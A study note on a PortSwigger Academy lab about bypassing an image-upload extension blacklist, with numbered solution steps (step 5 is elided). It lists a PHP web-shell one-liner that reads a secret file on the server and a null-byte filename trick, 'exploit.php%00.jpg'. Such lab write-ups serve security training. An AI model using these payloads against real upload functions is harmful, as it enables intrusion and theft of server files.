# Lab: Web shell upload via obfuscated file extension

**Official lab:** [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

## Lab idea

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique. This lab explores how differences in filename parsing can undermine extension checks. It practices assessing whether a file-type restriction remains reliable when names are interpreted differently across components.

## Vulnerability in brief
There is no widely used acronym for this topic.

## Solution idea
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> .
3. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret.
4. Attempt to upload this script as your avatar.
- …
6. Send the request and observe that the file was successfully uploaded.
7. Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request.
8. Submit the secret to solve the lab.

## Payloads / key values
- `GET`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `POST /my-account/avatar`
- `Content-Disposition`
- `filename`
- `.jpg`
- `filename="exploit.php%00.jpg"`
- `GET /files/avatars/<YOUR-IMAGE>`

## Official source
- [PortSwigger Academy: Lab: Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)
